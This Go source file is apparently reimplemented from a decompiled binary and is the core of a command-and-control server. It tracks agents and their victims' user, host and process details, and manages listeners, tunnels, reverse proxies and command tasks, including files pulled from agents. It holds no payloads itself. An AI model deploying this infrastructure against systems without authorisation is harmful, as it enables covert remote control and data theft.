package c2engine

import (
	"fmt"
	"sort"
	"sync"
	"time"
)

// ============================================================================
// C2Engine - Core C2 management (equivalent to eSxbx2zKVifD.C7cMcwDVYi_)
// ============================================================================

// Engine is the central C2 management system
type Engine struct {
	mu        sync.RWMutex
	config    *Config

	// Data stores
	clients   map[int64]*Client
	listeners map[int64]*Listener
	tunnels   map[int64]*Tunnel
	hosts     map[int64]*Host
	tasks     map[int64]*Task

	// ID sequences
	clientSeq   int64
	listenerSeq int64
	tunnelSeq   int64
	hostSeq     int64
	taskSeq     int64

	// VerifyKey → client ID index
	vkeyIndex map[string]int64

	// blockedKeys bars agents from (re-)checking in by their verify key. Keyed
	// by key rather than client ID: BlockClient deletes the engine client (and
	// its vkeyIndex entry), so a re-check-in would otherwise mint a fresh ID
	// that an ID-keyed blocklist could never match.
	blockedKeys map[string]bool

	// Storage
	storage *Storage
}

var (
	instance *Engine
	once     sync.Once
)

// GetEngine returns the singleton C2 engine instance
func GetEngine() *Engine {
	once.Do(func() {
		instance = &Engine{
			config:    DefaultConfig(),
			clients:   make(map[int64]*Client),
			listeners: make(map[int64]*Listener),
			tunnels:   make(map[int64]*Tunnel),
			hosts:     make(map[int64]*Host),
			tasks:     make(map[int64]*Task),
			vkeyIndex: make(map[string]int64),
			blockedKeys: make(map[string]bool),
		}
	})
	return instance
}

// Init initializes the engine with configuration and loads persisted data
func (e *Engine) Init(config *Config) error {
	if config != nil {
		e.config = config
	}

	e.storage = NewStorage(e.config.DBPath)

	// Load persisted data
	if err := e.storage.LoadClients(e.clients, &e.clientSeq); err != nil {
		Logf("Warning: failed to load clients: %v", err)
	}
	if err := e.storage.LoadListeners(e.listeners, &e.listenerSeq); err != nil {
		Logf("Warning: failed to load listeners: %v", err)
	}
	if err := e.storage.LoadHosts(e.hosts, &e.hostSeq); err != nil {
		Logf("Warning: failed to load hosts: %v", err)
	}
	if err := e.storage.LoadTasks(e.tasks, &e.taskSeq); err != nil {
		Logf("Warning: failed to load tasks: %v", err)
	}

	// Rebuild vkey index
	for id, c := range e.clients {
		if c.VerifyKey != "" {
			e.vkeyIndex[c.VerifyKey] = id
		}
	}

	Logf("Engine initialized with %d clients, %d listeners, %d tunnels, %d hosts",
		len(e.clients), len(e.listeners), len(e.tunnels), len(e.hosts))
	return nil
}

// Close releases the storage (SQLite) connection.
func (e *Engine) Close() error {
	if e.storage != nil {
		return e.storage.Close()
	}
	return nil
}

// ============================================================================
// Client management (C7cMcwDVYi_ equivalents)
// ============================================================================

// NewClient creates and stores a new client
// refresh sets *dst to src when src is non-empty (used to refresh a client's
// identity on re-checkin without wiping previously-known values).
func refresh(dst *string, src string) {
	if src != "" {
		*dst = src
	}
}

func (e *Engine) NewClient(verifyKey, clientType, addr, localIP, userName, hostName, osName, processName string) (*Client, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	// Reject blocked agents on every real check-in path (all handlers funnel
	// through NewClient): the blocklist is keyed by verify key so a fresh
	// client ID can't bypass it.
	if e.blockedKeys[verifyKey] {
		Logf("Rejected check-in from blocked verify key %q", verifyKey)
		return nil, fmt.Errorf("client is blocked")
	}

	// Check if client with same verify key already exists
	if existingID, ok := e.vkeyIndex[verifyKey]; ok {
		if client, ok := e.clients[existingID]; ok {
			client.UpdateSeen()
			client.Addr = addr
			// Refresh the agent's identity on re-checkin (a later checkin can
			// come from a different host, e.g. an agent rebuilt for another box).
			refresh(&client.LocalIP, localIP)
			refresh(&client.UserName, userName)
			refresh(&client.HostName, hostName)
			refresh(&client.OsName, osName)
			refresh(&client.ProcessName, processName)
			client.AddConn()
			return client, nil
		}
	}

	e.clientSeq++
	client := NewClient(e.clientSeq, verifyKey, clientType, addr)
	client.LocalIP = localIP
	client.UserName = userName
	client.HostName = hostName
	client.OsName = osName
	client.ProcessName = processName
	client.CreatedAt = time.Now()

	e.clients[client.ID] = client
	if verifyKey != "" {
		e.vkeyIndex[verifyKey] = client.ID
	}

	// Persist
	e.storage.StoreClients(e.clients)

	Logf("New client: %s@%s (ID: %d, OS: %s)", userName, hostName, client.ID, osName)
	return client, nil
}

// BlockKey bars agents presenting this verify key from checking in.
func (e *Engine) BlockKey(key string) {
	if key == "" {
		return
	}
	e.mu.Lock()
	e.blockedKeys[key] = true
	e.mu.Unlock()
}

// UnblockKey allows agents presenting this verify key to check in again.
func (e *Engine) UnblockKey(key string) {
	if key == "" {
		return
	}
	e.mu.Lock()
	delete(e.blockedKeys, key)
	e.mu.Unlock()
}

// IsKeyBlocked reports whether the verify key is blocked.
func (e *Engine) IsKeyBlocked(key string) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.blockedKeys[key]
}

// GetClient retrieves a client by ID
func (e *Engine) GetClient(id int64) *Client {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.clients[id]
}

// tunnelExists 客户端是否已建指定隧道（Client.HasTunnel 使用）。
func (e *Engine) tunnelExists(clientID, tunnelID int64) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	t, ok := e.tunnels[tunnelID]
	return ok && t != nil && t.ClientID == clientID
}

// tunnelCount 统计客户端隧道数（Client.GetTunnelNum 使用）。
func (e *Engine) tunnelCount(clientID int64) int {
	e.mu.RLock()
	defer e.mu.RUnlock()
	n := 0
	for _, t := range e.tunnels {
		if t.ClientID == clientID {
			n++
		}
	}
	return n
}

// hostExists 客户端是否已建指定主机（Client.HasHost 使用）。
func (e *Engine) hostExists(clientID, hostID int64) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	h, ok := e.hosts[hostID]
	return ok && h != nil && h.ClientID == clientID
}

// GetClientList 分页返回客户端列表（反编译 FUN_011970a0，30KB）：
// 参数 offset/limit 分页；field/order 排序（FUN_0049d800 字符串比较）；
// search 按字段过滤；status 过滤在线/离线。
func (e *Engine) GetClientList(offset, limit int, field, order, search, sort string, status int) ([]*Client, int64) {
	e.mu.RLock()
	defer e.mu.RUnlock()

	// 按 sort 字段排序（原版 FUN_0049d800 字符串比较），order 控制方向
	all := make([]*Client, 0, len(e.clients))
	for _, c := range e.clients {
		all = append(all, c)
	}
	sortClients(all, field, order)

	// search 过滤（原版按字段包含匹配）
	filtered := all
	if search != "" {
		filtered = make([]*Client, 0, len(all))
		for _, c := range all {
			if clientMatches(c, search) {
				filtered = append(filtered, c)
			}
		}
	}

	// status 过滤：1=仅在线，2=仅离线
	if status == 1 || status == 2 {
		f := make([]*Client, 0, len(filtered))
		for _, c := range filtered {
			online := c.NowConn > 0
			if (status == 1 && online) || (status == 2 && !online) {
				f = append(f, c)
			}
		}
		filtered = f
	}

	total := int64(len(filtered))
	if offset >= len(filtered) {
		return []*Client{}, total
	}
	end := offset + limit
	if end > len(filtered) {
		end = len(filtered)
	}
	return filtered[offset:end], total
}

// sortClients 按 field 字段排序（原版 GetClientList 排序逻辑）。
func sortClients(list []*Client, field, order string) {
	less := func(i, j int) bool {
		a, b := list[i], list[j]
		var r bool
		switch field {
		case "id":
			r = a.ID < b.ID
		case "ip":
			r = a.Addr < b.Addr
		case "remark":
			r = a.Remark < b.Remark
		case "os":
			r = a.OSType < b.OSType
		case "arch":
			r = a.Arch < b.Arch
		case "version":
			r = a.Version < b.Version
		case "lastTime":
			r = a.LastTime < b.LastTime
		default:
			r = a.ID < b.ID
		}
		if order == "desc" {
			return !r
		}
		return r
	}
	sort.SliceStable(list, less)
}

// clientMatches 检查客户端是否匹配 search 关键字。
func clientMatches(c *Client, search string) bool {
	return contains(c.Addr, search) || contains(c.Remark, search) ||
		contains(c.OSType, search) || contains(c.Arch, search) || contains(c.Version, search)
}

func contains(s, sub string) bool {
	return len(sub) > 0 && len(s) >= len(sub) && indexOf(s, sub) >= 0
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}

// GetClientIdByVkey finds a client ID by its verify key
func (e *Engine) GetClientIdByVkey(verifyKey string) (int64, bool) {
	e.mu.RLock()
	defer e.mu.RUnlock()
	id, ok := e.vkeyIndex[verifyKey]
	return id, ok
}

// GetIdByVerifyKey is an alias for GetClientIdByVkey (matching original binary naming)
func (e *Engine) GetIdByVerifyKey(verifyKey string) (int64, bool) {
	return e.GetClientIdByVkey(verifyKey)
}

// VerifyVkey checks whether an agent-supplied verify key matches the one
// bound to a client. Original binary: eSxbx2zKVifD.(*C7cMcwDVYi_).VerifyVkey.
// The key is the agent's communication credential ("通信凭据，通信的校验密码")
// checked during check-in; returns false for empty/missing clients.
func (e *Engine) VerifyVkey(id int64, vkey string) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	client, ok := e.clients[id]
	if !ok {
		return false
	}
	return client.VerifyKey == vkey
}

// DelClient removes a client and its associated data
func (e *Engine) DelClient(id int64) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	client, ok := e.clients[id]
	if !ok {
		return fmt.Errorf("client %d not found", id)
	}

	// Remove from vkey index
	if client.VerifyKey != "" {
		delete(e.vkeyIndex, client.VerifyKey)
	}

	// Remove all associated tunnels
	for tid := range client.tunnels {
		delete(e.tunnels, tid)
	}

	// Remove all associated hosts
	for hid := range client.Hosts {
		delete(e.hosts, hid)
	}

	delete(e.clients, id)
	e.storage.StoreClients(e.clients)
	e.storage.DelClient(id)

	Logf("Deleted client %d (%s@%s)", id, client.UserName, client.HostName)
	return nil
}

// IsHostExist checks if a host with the given ID exists
func (e *Engine) IsHostExist(id int64) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	_, ok := e.hosts[id]
	return ok
}

// IsPubClient checks if a client is enabled for use.
func (e *Engine) IsPubClient(id int64) bool {
	e.mu.RLock()
	defer e.mu.RUnlock()
	client := e.clients[id]
	return client != nil && client.Status
}

// ============================================================================
// Listener management
// ============================================================================

// NewListener creates and stores a new C2 listener
func (e *Engine) NewListener(listenAddr, connectAddr, mode, verifyKey, encryptSalt, remark string) (*Listener, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.listenerSeq++
	l := &Listener{
		ID:                e.listenerSeq,
		Status:            true,
		ListenAddr:        listenAddr,
		ConnectAddr:       connectAddr,
		Mode:              mode,
		VerifyKey:         verifyKey,
		EncryptSalt:       encryptSalt,
		Remark:            remark,
		DisconnectTimeout: 60,
		PingInterval:      10,
		MaxDNSsize:        512,
		CreatedAt:         time.Now(),
	}

	e.listeners[l.ID] = l
	e.storage.StoreListeners(e.listeners)

	Logf("New listener %d: %s (%s mode)", l.ID, listenAddr, mode)
	return l, nil
}

// GetListener retrieves a listener by ID
func (e *Engine) GetListener(id int64) *Listener {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.listeners[id]
}

// GetListenerList returns all listeners
func (e *Engine) GetListenerList() []*Listener {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*Listener, 0, len(e.listeners))
	for _, l := range e.listeners {
		result = append(result, l)
	}
	return result
}

// UpdateListener updates an existing listener
func (e *Engine) UpdateListener(id int64, updates map[string]interface{}) (*Listener, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	l, ok := e.listeners[id]
	if !ok {
		return nil, fmt.Errorf("listener %d not found", id)
	}

	if v, ok := updates["listen_addr"].(string); ok && v != "" {
		l.ListenAddr = v
	}
	if v, ok := updates["connect_addr"].(string); ok && v != "" {
		l.ConnectAddr = v
	}
	if v, ok := updates["mode"].(string); ok && v != "" {
		l.Mode = v
	}
	if v, ok := updates["remark"].(string); ok {
		l.Remark = v
	}
	if v, ok := updates["vkey"].(string); ok && v != "" {
		l.VerifyKey = v
	}
	if v, ok := updates["encrypt_salt"].(string); ok {
		l.EncryptSalt = v
	}

	e.storage.StoreListeners(e.listeners)
	return l, nil
}

// DelListener removes a listener
func (e *Engine) DelListener(id int64) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.listeners[id]; !ok {
		return fmt.Errorf("listener %d not found", id)
	}

	delete(e.listeners, id)
	e.storage.StoreListeners(e.listeners)
	e.storage.DelListener(id)

	Logf("Deleted listener %d", id)
	return nil
}

// ============================================================================
// Tunnel management
// ============================================================================

// NewTunnel 创建新隧道。
// NewTunnel creates a new tunnel.
func (e *Engine) NewTunnel(clientID int64, port int, mode, targetAddr string) (*Tunnel, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.clients[clientID]; !ok {
		return nil, fmt.Errorf("client %d not found", clientID)
	}

	e.tunnelSeq++
	t := NewTunnel(e.tunnelSeq, clientID, port, mode, targetAddr)
	e.tunnels[t.ID] = t

	// Associate with client
	if c, ok := e.clients[clientID]; ok {
		c.AddTunnel(t.ID)
	}

	Logf("New tunnel %d: port %d (%s) → client %d", t.ID, port, mode, clientID)
	return t, nil
}

// GetTunnel 按 ID 获取隧道。
// GetTunnel retrieves a tunnel by ID.
func (e *Engine) GetTunnel(id int64) *Tunnel {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.tunnels[id]
}

// GetTunnelList 返回全部隧道的切片。
// GetTunnelList returns all tunnels as a slice.
func (e *Engine) GetTunnelList() []*Tunnel {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*Tunnel, 0, len(e.tunnels))
	for _, t := range e.tunnels {
		result = append(result, t)
	}
	return result
}

// DelTunnel removes a tunnel
func (e *Engine) DelTunnel(id int64) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	t, ok := e.tunnels[id]
	if !ok {
		return fmt.Errorf("tunnel %d not found", id)
	}

	// Remove from client association
	if c, ok := e.clients[t.ClientID]; ok {
		c.RemoveTunnel(id)
	}

	delete(e.tunnels, id)
	e.storage.DelTunnel(id)
	return nil
}

// ============================================================================
// Host management
// ============================================================================

// NewHost 创建新的反向代理 Host。
// NewHost creates a new reverse proxy host.
func (e *Engine) NewHost(clientID int64, host, targetStr, scheme string) (*Host, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	e.hostSeq++
	h := NewHost(e.hostSeq, clientID, host, targetStr, scheme)
	e.hosts[h.ID] = h

	if c, ok := e.clients[clientID]; ok {
		c.AddHost(h.ID)
	}

	Logf("New host %d: %s://%s → %s (client %d)", h.ID, scheme, host, targetStr, clientID)
	return h, nil
}

// GetHost 按 ID 获取 Host。
// GetHost retrieves a host by ID.
func (e *Engine) GetHost(id int64) *Host {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.hosts[id]
}

// DelHost 删除 Host。
// DelHost removes a host.
func (e *Engine) DelHost(id int64) error {
	e.mu.Lock()
	defer e.mu.Unlock()

	h, ok := e.hosts[id]
	if !ok {
		return fmt.Errorf("host %d not found", id)
	}

	if c, ok := e.clients[h.ClientID]; ok {
		c.RemoveHost(id)
	}

	delete(e.hosts, id)
	e.storage.DelHost(id)
	return nil
}

// GetHostList 返回全部 Host 的切片。
// GetHostList returns all hosts as a slice.
func (e *Engine) GetHostList() []*Host {
	e.mu.RLock()
	defer e.mu.RUnlock()

	result := make([]*Host, 0, len(e.hosts))
	for _, h := range e.hosts {
		result = append(result, h)
	}
	return result
}

// UpdateHost 更新现有 Host 的配置。
// UpdateHost updates an existing host's configuration.
func (e *Engine) UpdateHost(id int64, updates map[string]interface{}) (*Host, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	h, ok := e.hosts[id]
	if !ok {
		return nil, fmt.Errorf("host %d not found", id)
	}

	if v, ok := updates["host"].(string); ok && v != "" {
		h.Host = v
	}
	if v, ok := updates["target_str"].(string); ok && v != "" {
		h.TargetStr = v
	}
	if v, ok := updates["scheme"].(string); ok && v != "" {
		h.Scheme = v
	}

	e.storage.StoreHosts(e.hosts)
	return h, nil
}

// ============================================================================
// Task management
// ============================================================================

// NewTask 为客户端创建新的命令任务。
// NewTask creates a new command task for a client.
// Original binary: eSxbx2zKVifD.(*C7cMcwDVYi_).NewTask — the engine-level
// task factory used by the task dispatch pipeline.
func (e *Engine) NewTask(clientID int64, command string, timeout int) (*Task, error) {
	return e.CreateTask(clientID, command, timeout)
}

// GetTask 按 ID 获取任务。
// GetTask retrieves a task by ID.
// Original binary: eSxbx2zKVifD.(*C7cMcwDVYi_).GetTask.
func (e *Engine) GetTask(id int64) *Task {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.tasks[id]
}

// DelTask 按 ID 删除任务。
// DelTask removes a task by ID.
// Original binary: eSxbx2zKVifD.(*C7cMcwDVYi_).DelTask.
func (e *Engine) DelTask(id int64) error {
	e.mu.Lock()
	defer e.mu.Unlock()
	if _, ok := e.tasks[id]; !ok {
		return fmt.Errorf("task %d not found", id)
	}
	delete(e.tasks, id)
	e.storage.StoreTasks(e.tasks)
	return nil
}

// CreateTask 为客户端创建新的命令任务。
// CreateTask creates a new command task for a client.
func (e *Engine) CreateTask(clientID int64, command string, timeout int) (*Task, error) {
	e.mu.Lock()
	defer e.mu.Unlock()

	if _, ok := e.clients[clientID]; !ok {
		return nil, fmt.Errorf("client %d not found", clientID)
	}

	e.taskSeq++
	task := &Task{
		ID:       e.taskSeq,
		ClientID: clientID,
		Command:  command,
		Status:   "pending",
		SentAt:   time.Now(),
		Timeout:  timeout,
	}

	e.tasks[task.ID] = task
	e.storage.StoreTasks(e.tasks)

	return task, nil
}

// UpdateTask 更新任务的状态与结果。
// UpdateTask updates a task's status and result.
func (e *Engine) UpdateTask(id int64, result, status string) error {
	e.mu.Lock()

	task, ok := e.tasks[id]
	if !ok {
		e.mu.Unlock()
		return fmt.Errorf("task %d not found", id)
	}

	task.Result = result
	task.Status = status
	now := time.Now()
	task.DoneAt = &now

	e.storage.StoreTasks(e.tasks)
	e.mu.Unlock()

	// Notify completion listeners (e.g. controllers persisting pulled files)
	// outside the lock: hooks may perform I/O and must not re-enter the engine.
	notifyTaskComplete(id, result, status)
	return nil
}

// SetTaskCompleteHook 注册任务完成回调（在引擎锁外调用）。
// SetTaskCompleteHook registers a callback invoked (outside the engine lock).
// whenever a task is updated to a terminal state. Registered by controllers,
// e.g. to persist files pulled from agents via the download command.
func SetTaskCompleteHook(f func(commandID int64, result, status string)) {
	taskCompleteHook = f
}

func notifyTaskComplete(commandID int64, result, status string) {
	if taskCompleteHook != nil {
		taskCompleteHook(commandID, result, status)
	}
}

var taskCompleteHook func(commandID int64, result, status string)

// GetPendingTasks returns pending tasks for a client
func (e *Engine) GetPendingTasks(clientID int64) []*Task {
	e.mu.RLock()
	defer e.mu.RUnlock()

	var result []*Task
	for _, t := range e.tasks {
		if t.ClientID == clientID && t.Status == "pending" {
			result = append(result, t)
		}
	}
	return result
}

// GetAndMarkPendingTasks returns pending tasks for a client and atomically
// marks them as dispatched, preventing races with the maintenance runner.
func (e *Engine) GetAndMarkPendingTasks(clientID int64) []*Task {
	e.mu.Lock()
	defer e.mu.Unlock()

	var result []*Task
	for _, t := range e.tasks {
		if t.ClientID == clientID && t.Status == "pending" {
			t.Status = "dispatched"
			result = append(result, t)
		}
	}
	return result
}

// GetTaskByMd5Password finds a task by its MD5 password (task-specific auth)
func (e *Engine) GetTaskByMd5Password(md5pass string) *Task {
	e.mu.RLock()
	defer e.mu.RUnlock()

	for _, t := range e.tasks {
		if t.MD5Pass == md5pass {
			return t
		}
	}
	return nil
}

// GetClientId returns the current client ID sequence value.
// Original binary: eSxbx2zKVifD.(*ZSeQgw1dB4ft).GetClientId — the ID
// sequence accessor for the entity tables.
func (e *Engine) GetClientId() int64 {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.clientSeq
}

// GetHostId returns the current host ID sequence value.
func (e *Engine) GetHostId() int64 {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.hostSeq
}

// GetListenerId returns the current listener ID sequence value.
func (e *Engine) GetListenerId() int64 {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.listenerSeq
}

// GetTaskId returns the current task ID sequence value.
func (e *Engine) GetTaskId() int64 {
	e.mu.RLock()
	defer e.mu.RUnlock()
	return e.taskSeq
}

// ============================================================================
// Statistics
// ============================================================================

// Stats holds engine statistics
type Stats struct {
	OnlineClients  int `json:"online_clients"`
	TotalClients   int `json:"total_clients"`
	TotalListeners int `json:"total_listeners"`
	ActiveTunnels  int `json:"active_tunnels"`
	TotalHosts     int `json:"total_hosts"`
	PendingTasks   int `json:"pending_tasks"`
}

// GetStats returns current engine statistics
func (e *Engine) GetStats() *Stats {
	e.mu.RLock()
	defer e.mu.RUnlock()

	online := 0
	cutoff := time.Now().Add(-60 * time.Second)
	for _, c := range e.clients {
		if c.LastSeen.After(cutoff) {
			online++
		}
	}

	pending := 0
	for _, t := range e.tasks {
		if t.Status == "pending" {
			pending++
		}
	}

	return &Stats{
		OnlineClients:  online,
		TotalClients:   len(e.clients),
		TotalListeners: len(e.listeners),
		ActiveTunnels:  len(e.tunnels),
		TotalHosts:     len(e.hosts),
		PendingTasks:   pending,
	}
}

// ============================================================================
// Persistence helpers
// ============================================================================

// Save persists all engine state
func (e *Engine) Save() {
	e.mu.RLock()
	defer e.mu.RUnlock()

	e.storage.StoreClients(e.clients)
	e.storage.StoreListeners(e.listeners)
	e.storage.StoreTasks(e.tasks)
}

